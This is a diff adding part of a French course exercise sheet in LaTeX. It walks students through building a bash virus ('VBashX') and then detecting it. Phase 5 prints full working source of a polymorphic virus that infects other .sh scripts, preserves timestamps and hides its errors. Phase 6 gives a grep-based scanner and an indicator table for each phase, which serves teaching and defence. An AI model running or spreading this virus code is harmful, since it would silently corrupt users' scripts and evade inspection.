+\subsection*{Phase 5 -- Furtivité}
+
+\begin{rappel}
+\textbf{Techniques de furtivité (\textit{stealth}) :}
+
+Un virus furtif cherche à dissimuler les traces de son activité :
+\begin{itemize}
+    \item \textbf{Préservation des horodatages :} la modification d'un fichier change sa date de dernière modification (\texttt{mtime}). Un administrateur surveillant les dates peut détecter l'infection.
+    \item \textbf{Nettoyage des fichiers temporaires :} les fichiers \texttt{.vbx\_tmp.sh} laissés par le virus sont des preuves.
+    \item \textbf{Suppression des erreurs :} les messages d'erreur sur \texttt{stderr} peuvent alerter l'utilisateur.
+\end{itemize}
+
+\textbf{Commandes clés :}
+\begin{itemize}
+    \item \texttt{cp -p fichier copie} : copie en préservant les attributs (horodatages, permissions)
+    \item \texttt{touch -r reference fichier} : applique les horodatages de \texttt{reference} à \texttt{fichier}
+    \item \texttt{trap "commandes" EXIT} : exécute \texttt{commandes} à la sortie du script (même en cas d'interruption Ctrl+C)
+    \item \texttt{2>/dev/null} : redirige \texttt{stderr} vers \texttt{/dev/null} (supprime les erreurs)
+\end{itemize}
+\end{rappel}
+
+\begin{enumerate}
+\item[\textbf{5a)}] \textbf{Préservation des horodatages :} Avant d'infecter un fichier, sauvegarder une copie de référence avec \texttt{cp -p "\$f" ".vbx\_ref\_\$\$"}, puis restaurer les horodatages après infection avec \texttt{touch -r ".vbx\_ref\_\$\$" "\$f"}.
+
+\item[\textbf{5b)}] \textbf{Nettoyage des fichiers temporaires :} Utiliser \texttt{trap "rm -f \$TMP .vbx\_ref\_*" EXIT} dans le code de restauration pour garantir le nettoyage même en cas d'interruption.
+
+\item[\textbf{5c)}] \textbf{Suppression des erreurs :} Ajouter \texttt{2>/dev/null} sur les commandes critiques (\texttt{grep}, \texttt{tail}, \texttt{cp}). Quelles erreurs cela masque-t-il ?
+\end{enumerate}
+
+\begin{correction}
+
+Le virus complet Phase 5 intègre les 3 techniques de furtivité au code de Phase 4 :
+\begin{lstlisting}[title=vbashx\_phase5.sh]
+#!/bin/bash
+echo "I am the host program"
+# --- VBashX Phase 5 --- VBX_7k9Pz
+REST_SIZE=13
+LI=16
+VIRUS_SIZE=$(($REST_SIZE + $LI))
+TMP=".vbx_tmp.sh"
+trap "rm -f $TMP .vbx_ref_*" EXIT
+echo "#!/bin/bash" > $TMP
+echo "SRC=\"$0\"" >> $TMP
+nb=1; while [ $nb -le $LI ]; do
+grep "#@${nb}#" "$0" >> $TMP
+nb=$(($nb + 1)); done
+chmod +x $TMP && ./$TMP
+exit 0
+MARKER="VBX_7k9Pz" #@1#
+for f in *.sh; do #@2#
+if [ "$(basename "$f")" != "$(basename "$SRC")" ]; then #@3#
+if [ -z "$(grep "$MARKER" "$f" 2>/dev/null)" ]; then #@4#
+cp -p "$f" ".vbx_ref_$$" 2>/dev/null #@5#
+REST_S=13; LI_S=16; VS=$(($REST_S + $LI_S)) #@6#
+tail -n $VS "$SRC" | head -n $REST_S >> "$f" 2>/dev/null #@7#
+r=$(( ($RANDOM % 16) + 1 )) #@8#
+n=1 #@9#
+while [ $n -le $LI_S ]; do #@10#
+grep "#@${r}#" "$SRC" >> "$f" 2>/dev/null #@11#
+r=$(( ($r * 3) % 17 )) #@12#
+n=$(($n + 1)); done #@13#
+touch -r ".vbx_ref_$$" "$f" 2>/dev/null #@14#
+rm -f ".vbx_ref_$$" 2>/dev/null #@15#
+fi; fi; done #@16#
+\end{lstlisting}
+
+\textbf{Modifications par rapport à Phase 4 :}
+\begin{itemize}
+    \item \textbf{Ligne 8 :} \texttt{trap} pour le nettoyage automatique à la sortie (5b)
+    \item \textbf{Lignes taguées \#@4\#, \#@5\#, \#@7\#, \#@11\# :} ajout de \texttt{2>/dev/null} pour masquer les erreurs (5c)
+    \item \textbf{Ligne \#@5\# :} \texttt{cp -p} pour sauvegarder les attributs du fichier original (5a)
+    \item \textbf{Ligne \#@14\# :} \texttt{touch -r} pour restaurer les horodatages après infection (5a)
+    \item \textbf{Ligne \#@15\# :} nettoyage du fichier de référence après restauration des timestamps
+\end{itemize}
+
+\textbf{5c)} Le \texttt{2>/dev/null} masque les erreurs suivantes :
+\begin{itemize}
+    \item \texttt{grep} : erreur si le fichier n'existe pas ou n'est pas lisible
+    \item \texttt{cp/tail} : erreur sur les permissions insuffisantes
+    \item \texttt{touch} : erreur si le fichier de référence a été supprimé
+\end{itemize}
+
+\begin{pointcle}
+\begin{itemize}
+    \item La \textbf{furtivité temporelle} (\texttt{touch -r}) empêche la détection par comparaison des dates de modification.
+    \item \texttt{trap ... EXIT} est une bonne pratique même hors contexte viral : il garantit le nettoyage des fichiers temporaires en cas d'interruption (\texttt{Ctrl+C}, erreur fatale).
+    \item \texttt{2>/dev/null} rend le virus silencieux mais empêche aussi le débogage. C'est un compromis furtivité/maintenabilité.
+    \item Le \texttt{REST\_SIZE} passe de 11 à 13 car le code de restauration inclut désormais le \texttt{trap}.
+\end{itemize}
+\end{pointcle}
+
+\end{correction}
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%% PHASE 6 : Analyse et détection
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\subsection*{Phase 6 -- Analyse et détection}
+
+\begin{rappel}
+\textbf{Méthodologie d'analyse -- Indicateurs de compromission (IoC) :}
+
+Un \textbf{indicateur de compromission} (\textit{Indicator of Compromise}, IoC) est un artefact observable qui signale une infection. Les types de détection :
+\begin{itemize}
+    \item \textbf{Par signature} (\textit{pattern matching}) : recherche de chaînes de caractères connues (marqueurs, noms de variables)
+    \item \textbf{Heuristique} : détection de patterns suspects (ex : un script qui se copie lui-même)
+    \item \textbf{Comportementale} : analyse du comportement à l'exécution (ex : un script qui modifie d'autres scripts)
+\end{itemize}
+
+\textbf{Commandes \texttt{grep} utiles pour l'analyse :}
+\begin{itemize}
+    \item \texttt{grep -q "pattern" fichier} : mode silencieux, retourne uniquement le code de sortie (0 si trouvé)
+    \item \texttt{grep -l "pattern" *.sh} : liste les fichiers contenant le pattern
+    \item \texttt{grep -c "pattern" fichier} : compte les occurrences
+\end{itemize}
+\end{rappel}
+
+\begin{enumerate}
+\item[\textbf{6a)}] \textbf{Scanner :} Écrire un script \texttt{scanner.sh} qui parcourt les fichiers \texttt{.sh} d'un répertoire (passé en argument ou \texttt{.} par défaut) et détecte les IoC suivants :
+\begin{itemize}
+    \item Signature du marqueur : \texttt{VBX\_7k9Pz}
+    \item Marqueurs de lignes taguées : \texttt{\#@n\#}
+    \item Pattern comportemental d'auto-réplication : \texttt{tail.*\$0.*>>}
+    \item Pattern de restauration : \texttt{grep.*\#@}
+\end{itemize}
+Afficher pour chaque fichier les IoC détectés, puis un résumé (infectés/sains).
+
+\item[\textbf{6b)}] \textbf{Tableau IoC :} Pour chaque phase (1--5), identifier la technique employée et l'IoC détectable correspondant.
+
+\item[\textbf{6c)}] \textbf{Réflexion :} Le polymorphisme par réordonnancement rend-il la détection impossible ? Quel invariant reste exploitable ? Quel type de détection (syntaxique, comportementale, heuristique) serait le plus efficace ?
+\end{enumerate}
+
+\begin{correction}
+
+\textbf{6a)} Scanner de détection :
+\begin{lstlisting}[title=scanner.sh]
+#!/bin/bash
+# VBashX Scanner - Detection of infected files
+echo "=== VBashX Scanner ==="
+DIR="${1:-.}"
+echo "Scanning directory: $DIR"
+echo ""
+INFECTED=0
+CLEAN=0
+
+for f in "$DIR"/*.sh; do
+    [ -f "$f" ] || continue
+    INDICATORS=""
+    # IoC 1: Marker signature
+    if grep -q "VBX_7k9Pz" "$f" 2>/dev/null; then
+        INDICATORS="$INDICATORS [MARKER:VBX_7k9Pz]"
+    fi
+    # IoC 2: Tagged lines (polymorphism)
+    if grep -q "#@[0-9]*#" "$f" 2>/dev/null; then
+        INDICATORS="$INDICATORS [TAGGED_LINES]"
+    fi
+    # IoC 3: Behavioral pattern (tail...$0..>>)
+    if grep -q 'tail.*\$0.*>>' "$f" 2>/dev/null; then
+        INDICATORS="$INDICATORS [TAIL_APPEND]"
+    fi
+    # IoC 4: Restoration pattern (grep for tags)
+    if grep -q 'grep.*#@' "$f" 2>/dev/null; then
+        INDICATORS="$INDICATORS [RESTORATION]"
+    fi
+    if [ -n "$INDICATORS" ]; then
+        echo "[INFECTED] $(basename "$f"):$INDICATORS"
+        INFECTED=$(($INFECTED + 1))
+    else
+        echo "[CLEAN]    $(basename "$f")"
+        CLEAN=$(($CLEAN + 1))
+    fi
+done
+
+echo ""
+echo "=== Results ==="
+echo "Infected: $INFECTED"
+echo "Clean:    $CLEAN"
+echo "Total:    $(($INFECTED + $CLEAN))"
+\end{lstlisting}
+
+\textbf{6b)} Tableau des IoC par phase :
+\begin{center}
+\begin{tabular}{clll}
+\toprule
+\textbf{Phase} & \textbf{Technique} & \textbf{IoC détectable} & \textbf{Détection} \\
+\midrule
+1 & Ajout simple & \texttt{tail .* \$0 .* >>} & Heuristique \\
+2a & Marqueur & Signature \texttt{VBX\_7k9Pz} & Signature \\
+2b & Comparaison tail & \texttt{tail .* \$0 .* >>} & Heuristique \\
+3 & Payload & \texttt{date +\%u}, \texttt{.vbx\_count} & Heuristique \\
+4 & Polymorphisme & Code restauration, \texttt{\#@n\#} & Signature du restaurateur \\
+5 & Furtivité & \texttt{touch -r}, \texttt{trap} & Heuristique \\
+\bottomrule
+\end{tabular}
+\end{center}
+
+\textbf{6c)} Le polymorphisme par réordonnancement ne rend \textbf{pas} la détection impossible :
+\begin{itemize}
+    \item L'\textbf{invariant exploitable} est le code de restauration : il reste identique dans tous les fichiers infectés (il extrait les lignes taguées dans l'ordre via \texttt{grep "\#@\$\{nb\}\#"}).
+    \item La \textbf{détection comportementale} est la plus efficace car elle détecte l'\textit{intention} du virus (pattern \texttt{tail .* \$0 .* >>}) plutôt que sa forme exacte. Même si le code change d'ordre, le comportement d'auto-réplication reste identique.
+    \item La détection \textbf{par signature du restaurateur} fonctionne bien : le code \texttt{grep "\#@\$\{nb\}\#" "\$0"} est un pattern très spécifique et peu probable dans un script légitime.
+    \item Pour vaincre cette détection, il faudrait un \textbf{polymorphisme du restaurateur lui-même} (métamorphisme), ce qui est beaucoup plus complexe.
+\end{itemize}
+
+\begin{attention}
+Le scanner lui-même contient certains patterns qu'il recherche (comme \texttt{VBX\_7k9Pz}). Il pourrait donc se détecter comme infecté ! En pratique, on exclurait le scanner de l'analyse, ou on utiliserait des patterns compilés (regex) plutôt que des chaînes littérales.
+\end{attention}
+
+\begin{pointcle}
+\begin{itemize}
+    \item Le code de restauration est l'\textbf{invariant détectable} du virus polymorphe. C'est l'analogue du \textit{décrypteur} dans un virus chiffré.
+    \item La détection \textbf{comportementale} (pattern \texttt{tail .* \$0 .* >>}) est la plus robuste car elle détecte l'\textbf{intention} (auto-réplication) plutôt que la forme du code.
+    \item Un bon scanner combine plusieurs types d'IoC pour réduire les faux positifs et les faux négatifs.
+    \item La course entre virus et antivirus est un \textbf{jeu du chat et de la souris} : chaque technique de dissimulation appelle une nouvelle technique de détection, et inversement.
+\end{itemize}
+\end{pointcle}
+
+\end{correction}
+
+\end{exercice}
+
+\end{document}
